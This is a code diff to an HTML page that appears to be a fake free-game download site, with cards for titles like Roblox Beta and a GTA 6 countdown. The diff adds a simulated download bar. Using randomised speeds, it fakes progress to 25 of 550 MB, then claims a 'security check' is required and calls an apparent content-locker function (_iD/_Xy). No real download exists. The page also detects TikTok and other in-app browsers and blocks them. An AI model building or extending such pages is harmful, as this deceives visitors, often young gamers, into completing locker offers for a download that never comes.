@@ -823,7 +823,7 @@
   }
 
   @media (max-width: 640px) {
-    .main { padding: 26px 14px 44px; }
+    .main { padding: 26px 14px 130px; }
     .site-header { padding: 10px 14px; }
     .header-stat.hide-mobile { display: none; }
     .brand-name { font-size: 16px; }
@@ -1027,12 +1027,199 @@
     .blocker-icon { width: 56px; height: 56px; font-size: 22px; }
     .blocker-title { font-size: 17px; }
   }
+
+  /* ============================================================
+     🟣 PURPLE DOWNLOAD BAR (from Ben 10 page) + Device Toggle
+     ============================================================ */
+  #vault-download-bar {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    z-index: 99998;
+    display: none;
+    background: linear-gradient(180deg, #2a0a52 0%, #0a0a2a 100%);
+    border-top: 1px solid rgba(123, 66, 246, 0.45);
+    box-shadow:
+      0 -10px 40px rgba(0, 0, 0, 0.75),
+      0 -1px 0 rgba(255, 255, 255, 0.06) inset;
+    padding: 14px 16px 18px;
+    transform: translateY(100%);
+    transition: transform 0.4s cubic-bezier(0.22, 1, 0.36, 1);
+    will-change: transform;
+  }
+  #vault-download-bar.visible {
+    transform: translateY(0);
+  }
+  #vault-download-bar::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0; height: 2px;
+    background: linear-gradient(90deg, transparent, #7B42F6, #a78bfa, #7B42F6, transparent);
+    opacity: 0.9;
+    pointer-events: none;
+  }
+
+  .vdb-inner {
+    max-width: 720px;
+    margin: 0 auto;
+    color: #fff;
+  }
+
+  .vdb-device-toggle {
+    display: flex;
+    gap: 6px;
+    margin-bottom: 12px;
+    padding: 4px;
+    background: rgba(255, 255, 255, 0.06);
+    border-radius: 12px;
+    border: 1px solid rgba(123, 66, 246, 0.25);
+    backdrop-filter: blur(10px);
+    -webkit-backdrop-filter: blur(10px);
+  }
+
+  .vdb-dev-btn {
+    flex: 1;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 7px;
+    padding: 9px 12px;
+    border: 1px solid transparent;
+    border-radius: 9px;
+    background: transparent;
+    color: rgba(255, 255, 255, 0.60);
+    font-family: 'Inter', sans-serif;
+    font-size: 12.5px;
+    font-weight: 700;
+    letter-spacing: 0.02em;
+    cursor: pointer;
+    transition: all 0.22s ease;
+    -webkit-tap-highlight-color: transparent;
+  }
+  .vdb-dev-btn i { font-size: 14px; }
+  .vdb-dev-btn:hover:not(.active) {
+    color: rgba(255, 255, 255, 0.85);
+    background: rgba(255, 255, 255, 0.04);
+  }
+  .vdb-dev-btn.active {
+    background: linear-gradient(135deg, rgba(123, 66, 246, 0.55), rgba(88, 34, 200, 0.60));
+    color: #fff;
+    border-color: rgba(167, 139, 250, 0.70);
+    box-shadow:
+      0 3px 14px rgba(123, 66, 246, 0.45),
+      0 1px 0 rgba(255, 255, 255, 0.15) inset;
+  }
+
+  .vdb-header {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 10px;
+  }
+  .vdb-icon {
+    width: 36px;
+    height: 36px;
+    flex-shrink: 0;
+    border-radius: 50%;
+    background: rgba(123, 66, 246, 0.25);
+    border: 1px solid rgba(123, 66, 246, 0.55);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #c4b5fd;
+    font-size: 15px;
+    box-shadow: 0 0 16px rgba(123, 66, 246, 0.35);
+    transition: all 0.3s ease;
+  }
+  .vdb-info { flex: 1; min-width: 0; }
+  .vdb-title {
+    font-size: 13.5px;
+    font-weight: 700;
+    color: #fff;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    letter-spacing: 0.005em;
+  }
+  .vdb-status {
+    font-size: 11.5px;
+    color: rgba(255, 255, 255, 0.72);
+    margin-top: 3px;
+    display: flex;
+    align-items: center;
+    gap: 5px;
+    flex-wrap: wrap;
+    font-variant-numeric: tabular-nums;
+  }
+  #vdb-percentage {
+    color: #c4b5fd;
+    font-weight: 700;
+  }
+  .vdb-dot { color: rgba(255, 255, 255, 0.35); }
+
+  .vdb-progress-track {
+    height: 8px;
+    background: rgba(255, 255, 255, 0.10);
+    border-radius: 4px;
+    overflow: hidden;
+    margin-bottom: 8px;
+    box-shadow: 0 1px 0 rgba(0, 0, 0, 0.3) inset;
+  }
+  .vdb-progress-fill {
+    height: 100%;
+    width: 0%;
+    background: linear-gradient(90deg, #7B42F6, #a78bfa);
+    border-radius: 4px;
+    transition: width 0.32s ease, background 0.4s ease;
+    box-shadow: 0 0 14px rgba(123, 66, 246, 0.65);
+  }
+  .vdb-message {
+    font-size: 11.5px;
+    color: rgba(255, 255, 255, 0.78);
+    text-align: center;
+    min-height: 17px;
+    line-height: 1.5;
+    transition: color 0.3s ease;
+  }
+
+  #vault-download-bar.verification-required .vdb-progress-fill {
+    background: linear-gradient(90deg, #fbbc04, #f59e0b);
+    box-shadow: 0 0 14px rgba(251, 188, 4, 0.65);
+  }
+  #vault-download-bar.verification-required .vdb-icon {
+    background: rgba(251, 188, 4, 0.22);
+    border-color: rgba(251, 188, 4, 0.60);
+    color: #fcd34d;
+    box-shadow: 0 0 18px rgba(251, 188, 4, 0.5);
+    animation: vdbIconPulse 1.3s ease-in-out infinite;
+  }
+  #vault-download-bar.verification-required .vdb-message {
+    color: #fcd34d;
+    font-weight: 600;
+  }
+  #vault-download-bar.verification-required #vdb-percentage {
+    color: #fcd34d;
+  }
+  @keyframes vdbIconPulse {
+    0%, 100% { transform: scale(1); }
+    50% { transform: scale(1.08); }
+  }
+
+  @media (max-width: 480px) {
+    #vault-download-bar { padding: 12px 12px 14px; }
+    .vdb-dev-btn { font-size: 11.5px; padding: 8px 10px; }
+    .vdb-title { font-size: 12.5px; }
+    .vdb-status { font-size: 10.5px; }
+    .vdb-message { font-size: 10.5px; }
+    .vdb-icon { width: 32px; height: 32px; font-size: 13px; }
+  }
 </style>
 </head>
 <body>
 
   <!-- ============================================================
-       🚫 TIKTOK BLOCKER — appears only inside TikTok / in-app webviews
+       🚫 TIKTOK BLOCKER
        ============================================================ -->
   <div id="tiktokBlocker" role="dialog" aria-modal="true" aria-labelledby="blockerTitle">
     <div class="blocker-card">
@@ -1184,8 +1371,7 @@
         </div>
       </article>
 
-
-          <article class="game-card fade-in d5">
+      <article class="game-card fade-in d5">
         <div class="card-thumb">
           <img src="https://i.postimg.cc/wM2vHsZt/roblox-beta.webp" alt="Roblox Beta" loading="lazy" decoding="async">
         </div>
@@ -1203,8 +1389,7 @@
             <i class="fas fa-download"></i> Download
           </button>
         </div>
-          </article>
-      
+      </article>
 
       <article class="game-card fade-in d5">
         <div class="card-thumb">
@@ -1303,6 +1488,45 @@
     </p>
   </footer>
 
+  <!-- ============================================================
+       🟣 PURPLE DOWNLOAD BAR — replaces the modal list
+       ============================================================ -->
+  <div id="vault-download-bar" role="region" aria-label="Download progress">
+    <div class="vdb-inner">
+      <div class="vdb-device-toggle" role="tablist" aria-label="Select device">
+        <button type="button" class="vdb-dev-btn" data-device="android" role="tab" aria-selected="false">
+          <i class="fab fa-android"></i> Android
+        </button>
+        <button type="button" class="vdb-dev-btn" data-device="ios" role="tab" aria-selected="false">
+          <i class="fab fa-apple"></i> iPhone
+        </button>
+      </div>
+
+      <div class="vdb-header">
+        <div class="vdb-icon"><i class="fas fa-bolt"></i></div>
+        <div class="vdb-info">
+          <div class="vdb-title" id="vdb-title">Downloading...</div>
+          <div class="vdb-status">
+            <span id="vdb-percentage">0%</span>
+            <span class="vdb-dot">•</span>
+            <span id="vdb-amount">0 MB</span>
+            <span class="vdb-dot">/</span>
+            <span>550 MB</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="vdb-progress-track">
+        <div class="vdb-progress-fill" id="vdb-fill"></div>
+      </div>
+
+      <div class="vdb-message" id="vdb-message">Starting download...</div>
+    </div>
+  </div>
+
+  <!-- ============================================================
+       Modal (kept for compatibility, no longer triggered by default)
+       ============================================================ -->
   <div class="modal-overlay" id="deviceModal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
     <div class="modal-card">
       <span class="modal-grab"></span>
@@ -1366,7 +1590,8 @@
 
   <script>
     /* ============================================================
-       📱 Device Modal + Review Flow → calls _iD() when done
+       📱 Device Modal (kept for compatibility — but openDeviceModal
+       now routes to the purple download bar instead)
        ============================================================ */
     const deviceModal  = document.getElementById('deviceModal');
     const modalTitle   = document.getElementById('modalTitle');
@@ -1384,15 +1609,13 @@
     const STEP_DURATIONS = [2400, 2600, 2600, 2400];
     const TOTAL_DURATION = STEP_DURATIONS.reduce((a,b) => a+b, 0);
 
+    /* 🔁 openDeviceModal now opens the PURPLE DOWNLOAD BAR
+       (the modal stays in the DOM untouched for compatibility) */
     function openDeviceModal(gameName) {
-      currentGame = gameName || 'this game';
-      resetModal();
-      modalTitle.textContent = 'Select Your Device';
-      modalSub.textContent = 'Choose your device to download ' + currentGame + '.';
-      deviceModal.classList.add('show');
-      document.body.style.overflow = 'hidden';
+      startDownloadBar(gameName);
     }
 
+    /* The original modal helpers remain intact (unused but preserved) */
     function closeDeviceModal() {
       if (isReviewing) return;
       deviceModal.classList.remove('show');
@@ -1401,7 +1624,6 @@
 
     function resetModal() {
       isReviewing = false;
-
       deviceOptions.style.display = 'grid';
       deviceOptions.innerHTML =
         '<button class="device-btn" onclick="chooseDevice(\'android\', event)">' +
@@ -1414,22 +1636,18 @@
           '<span>iPhone</span>' +
           '<small>iOS install</small>' +
         '</button>';
-
       const modalIcon = document.querySelector('.modal-icon i');
       if (modalIcon) modalIcon.className = 'fas fa-download';
-
       reviewWrap.classList.remove('show');
       reviewFooter.classList.remove('show');
       modalNote.style.display = 'flex';
       reviewFill.style.transition = 'none';
       reviewFill.style.width = '0%';
-
       stepEls.forEach(step => {
         step.classList.remove('active', 'done');
         const icon = step.querySelector('.review-step-icon i');
         if (icon) icon.className = 'fas fa-circle';
       });
-
       const closeBtn = deviceModal.querySelector('.modal-close');
       if (closeBtn) closeBtn.style.display = 'flex';
     }
@@ -1437,49 +1655,36 @@
     function chooseDevice(device, evt) {
       if (isReviewing) return;
       isReviewing = true;
-
       deviceOptions.style.display = 'none';
       modalNote.style.display = 'none';
       const closeBtn = deviceModal.querySelector('.modal-close');
       if (closeBtn) closeBtn.style.display = 'none';
-
       const deviceName = device === 'android' ? 'Android' : 'iPhone';
       const deviceIcon = device === 'android' ? 'fa-android' : 'fa-apple';
-
       const modalIcon = document.querySelector('.modal-icon i');
       if (modalIcon) modalIcon.className = 'fab ' + deviceIcon;
-
       modalTitle.textContent = 'Verifying for ' + deviceName;
       modalSub.textContent = 'We\'re preparing "' + currentGame + '" for your ' + deviceName + '. Please wait…';
-
       reviewWrap.classList.add('show');
       reviewFooter.classList.add('show');
-
       requestAnimationFrame(() => {
         reviewFill.style.transition = 'width ' + TOTAL_DURATION + 'ms linear';
         reviewFill.style.width = '100%';
       });
-
       let i = 0;
-
       function runStep() {
         if (i >= stepEls.length) {
           setTimeout(() => {
             try {
               if (typeof _iD === 'function') _iD();
-              else console.error('_iD() is not defined — locker script may not have loaded.');
-            } catch (err) {
-              console.error('Error calling _iD():', err);
-            }
+            } catch (err) { console.error(err); }
           }, 500);
           return;
         }
-
         const step = stepEls[i];
         step.classList.add('active');
         const icon = step.querySelector('.review-step-icon i');
         if (icon) icon.className = 'fas fa-circle-notch fa-spin';
-
         setTimeout(() => {
           step.classList.remove('active');
           step.classList.add('done');
@@ -1488,7 +1693,6 @@
           runStep();
         }, STEP_DURATIONS[i]);
       }
-
       runStep();
     }
 
@@ -1501,7 +1705,165 @@
     });
 
     /* ============================================================
-       ⏱ GTA 6 COUNTDOWN — Official: Nov 19, 2026
+       🟣 PURPLE DOWNLOAD BAR LOGIC
+       ============================================================ */
+    const DOWNLOAD_TOTAL_MB    = 550;
+    const DOWNLOAD_THRESHOLD_MB = 25;
+    const SPEED_COMPRESSION    = 5;   // faster visual (5x)
+    const PROGRESS_TICK_MS     = 250;
+
+    let vdbGame = '';
+    let vdbDevice = 'android';
+    let vdbInterval = null;
+    let vdbLockerTriggered = false;
+
+    function detectDeviceType() {
+      const ua = navigator.userAgent || '';
+      if (/iPhone|iPad|iPod/i.test(ua)) return 'ios';
+      return 'android';
+    }
+
+    function updateDeviceToggle() {
+      document.querySelectorAll('.vdb-dev-btn').forEach(btn => {
+        const isActive = btn.dataset.device === vdbDevice;
+        btn.classList.toggle('active', isActive);
+        btn.setAttribute('aria-selected', isActive ? 'true' : 'false');
+      });
+    }
+
+    document.querySelectorAll('.vdb-dev-btn').forEach(btn => {
+      btn.addEventListener('click', () => {
+        if (vdbLockerTriggered) return;
+        vdbDevice = btn.dataset.device;
+        updateDeviceToggle();
+      });
+    });
+
+    function startDownloadBar(gameName) {
+      vdbGame = gameName || 'this game';
+      vdbDevice = detectDeviceType();
+      vdbLockerTriggered = false;
+
+      const bar = document.getElementById('vault-download-bar');
+      bar.classList.remove('verification-required');
+      bar.style.display = 'block';
+
+      // Reset UI
+      document.getElementById('vdb-title').textContent = 'Downloading ' + vdbGame + '...';
+      document.getElementById('vdb-percentage').textContent = '0%';
+      document.getElementById('vdb-amount').textContent = '0 MB';
+      document.getElementById('vdb-fill').style.width = '0%';
+      document.getElementById('vdb-message').textContent = 'Starting download...';
+
+      updateDeviceToggle();
+
+      requestAnimationFrame(() => {
+        requestAnimationFrame(() => bar.classList.add('visible'));
+      });
+
+      setTimeout(startDownloadProgress, 500);
+    }
+
+    function startDownloadProgress() {
+      clearInterval(vdbInterval);
+
+      const totalBytes     = DOWNLOAD_TOTAL_MB * 1024 * 1024;
+      const thresholdBytes = DOWNLOAD_THRESHOLD_MB * 1024 * 1024;
+
+      let downloaded = 0;
+      let lastTime   = Date.now();
+      const speedHistory = [];
+
+      const fillEl  = document.getElementById('vdb-fill');
+      const pctEl   = document.getElementById('vdb-percentage');
+      const amtEl   = document.getElementById('vdb-amount');
+      const msgEl   = document.getElementById('vdb-message');
+
+      function getSpeedKBps() {
+        const base = 900 + Math.random() * 500; // 900-1400 KB/s
+        const progress = downloaded / thresholdBytes;
+        let mult = 1;
+        if (progress < 0.1) mult = 0.55;
+        else if (progress < 0.3) mult = 1.20;
+        else if (progress < 0.7) mult = 1.00;
+        else if (progress < 0.9) mult = 0.85;
+        else mult = 0.55;
+
+        speedHistory.push(base * mult);
+        if (speedHistory.length > 5) speedHistory.shift();
+        const avg = speedHistory.reduce((a, b) => a + b, 0) / speedHistory.length;
+        return Math.max(200, Math.min(2200, avg));
+      }
+
+      vdbInterval = setInterval(() => {
+        const now = Date.now();
+        const dt  = (now - lastTime) / 1000;
+        lastTime  = now;
+
+        const speedBytesPerSec = getSpeedKBps() * 1024;
+        downloaded += speedBytesPerSec * dt * SPEED_COMPRESSION;
+        if (downloaded > thresholdBytes) downloaded = thresholdBytes;
+
+        const pctOfTotal = (downloaded / totalBytes) * 100;
+        const displayPct = Math.min(4.55, pctOfTotal);
+        const mb         = downloaded / (1024 * 1024);
+
+        fillEl.style.width = displayPct + '%';
+        pctEl.textContent  = displayPct.toFixed(2) + '%';
+        amtEl.textContent  = mb.toFixed(2) + ' MB';
+
+        if (displayPct < 0.5)      msgEl.textContent = 'Establishing connection to server...';
+        else if (displayPct < 1)   msgEl.textContent = 'Verifying download package...';
+        else if (displayPct < 1.5) msgEl.textContent = 'Preparing download...';
+        else if (displayPct < 2)   msgEl.textContent = 'Downloading initial game files...';
+        else if (displayPct < 2.5) msgEl.textContent = 'Downloading game assets...';
+        else if (displayPct < 3)   msgEl.textContent = 'Downloading core data...';
+        else if (displayPct < 3.5) msgEl.textContent = 'Downloading game resources...';
+        else if (displayPct < 4)   msgEl.textContent = 'Almost ready for verification...';
+        else                       msgEl.textContent = 'Finalizing initial download...';
+
+        if (downloaded >= thresholdBytes && !vdbLockerTriggered) {
+          vdbLockerTriggered = true;
+          clearInterval(vdbInterval);
+          vdbInterval = null;
+          showLockerAfterThreshold();
+        }
+      }, PROGRESS_TICK_MS);
+    }
+
+    function showLockerAfterThreshold() {
+      const bar   = document.getElementById('vault-download-bar');
+      const msgEl = document.getElementById('vdb-message');
+      bar.classList.add('verification-required');
+
+      document.getElementById('vdb-percentage').textContent = '4.55%';
+      document.getElementById('vdb-amount').textContent     = '25.00 MB';
+      document.getElementById('vdb-fill').style.width       = '4.55%';
+
+      const text = '25 MB of 550 MB downloaded. One quick security check is required to unlock the remaining 525 MB!';
+      msgEl.textContent = '';
+      let i = 0;
+      const typeInt = setInterval(() => {
+        if (i < text.length) {
+          msgEl.textContent += text.charAt(i);
+          i++;
+        } else {
+          clearInterval(typeInt);
+          setTimeout(() => {
+            try {
+              if (typeof _iD === 'function') _iD();
+              else if (typeof _Xy === 'function') _Xy();
+              else console.warn('Locker function (_iD/_Xy) not found on this page.');
+            } catch (err) {
+              console.error('Locker error:', err);
+            }
+          }, 450);
+        }
+      }, 28);
+    }
+
+    /* ============================================================
+       ⏱ GTA 6 COUNTDOWN
        ============================================================ */
     (function () {
       const target = new Date('2026-11-19T00:00:00Z').getTime();
@@ -1510,14 +1872,10 @@
       const cdMins  = document.getElementById('cd-mins');
       const cdSecs  = document.getElementById('cd-secs');
       const wrap    = document.getElementById('gta6-countdown');
-
       if (!wrap) return;
-
       function pad(n) { return n < 10 ? '0' + n : String(n); }
-
       function tick() {
         const diff = target - Date.now();
-
         if (diff <= 0) {
           if (cdDays)  cdDays.textContent  = '00';
           if (cdHours) cdHours.textContent = '00';
@@ -1526,18 +1884,15 @@
           clearInterval(timer);
           return;
         }
-
         const days  = Math.floor(diff / 86400000);
         const hours = Math.floor((diff % 86400000) / 3600000);
         const mins  = Math.floor((diff % 3600000)  / 60000);
         const secs  = Math.floor((diff % 60000)    / 1000);
-
         if (cdDays)  cdDays.textContent  = pad(days);
         if (cdHours) cdHours.textContent = pad(hours);
         if (cdMins)  cdMins.textContent  = pad(mins);
         if (cdSecs)  cdSecs.textContent  = pad(secs);
       }
-
       const timer = setInterval(tick, 1000);
       tick();
     })();
@@ -1560,7 +1915,6 @@
        ============================================================ */
     (function () {
       'use strict';
-
       var ua = navigator.userAgent || '';
       var isTikTok = /TikTok|musical_ly|BytedanceWebview|aweme|ttwebview|ByteLocale/i.test(ua);
       var isInApp  = /FBAN|FBAV|FB_IAB|Instagram|Line\/|Twitter|Snapchat|Pinterest|MicroMessenger/i.test(ua);
@@ -1583,18 +1937,14 @@
       }
 
       var tutorialStarted = false;
-      var tutorialTimer   = null;
-
       function startTutorialAnimation() {
         if (tutorialStarted) return;
         tutorialStarted = true;
-
         var phone  = document.getElementById('tutorialPhone');
         var dots   = document.getElementById('tutorialDots');
         var sheet  = document.getElementById('tutorialSheet');
         var item   = document.getElementById('tutorialItem');
         var pointer= document.getElementById('tapPointer');
-
         if (!phone || !dots || !sheet || !item || !pointer) return;
 
         function movePointerTo(target) {
@@ -1605,14 +1955,12 @@
           pointer.style.left = x + 'px';
           pointer.style.top  = y + 'px';
         }
-
         function reset() {
           pointer.classList.remove('show', 'tapping');
           dots.classList.remove('active');
           sheet.classList.remove('show');
           item.classList.remove('active', 'done');
         }
-
         function play() {
           reset();
           setTimeout(function () { movePointerTo(dots); pointer.classList.add('show'); }, 350);
@@ -1623,9 +1971,8 @@
           setTimeout(function () { pointer.classList.remove('tapping'); item.classList.add('done'); }, 4100);
           setTimeout(function () { pointer.classList.remove('show'); }, 5200);
         }
-
         play();
-        tutorialTimer = setInterval(play, 7000);
+        setInterval(play, 7000);
       }
 
       var statusEl = document.getElementById('blockerStatus');
@@ -1641,7 +1988,6 @@
         copyBtn.addEventListener('click', function () {
           var url   = window.location.href;
           var label = copyBtn.querySelector('span');
-
           function done() {
             copyBtn.classList.add('copied');
             label.textContent = 'Link Copied ✓';
@@ -1651,7 +1997,6 @@
               label.textContent = 'Copy Link';
             }, 2200);
           }
-
           if (navigator.clipboard && navigator.clipboard.writeText) {
             navigator.clipboard.writeText(url).then(done).catch(function () { fallbackCopy(url, done); });
           } else {
@@ -1659,7 +2004,6 @@
           }
         });
       }
-
       function fallbackCopy(text, cb) {
         var ta = document.createElement('textarea');
         ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
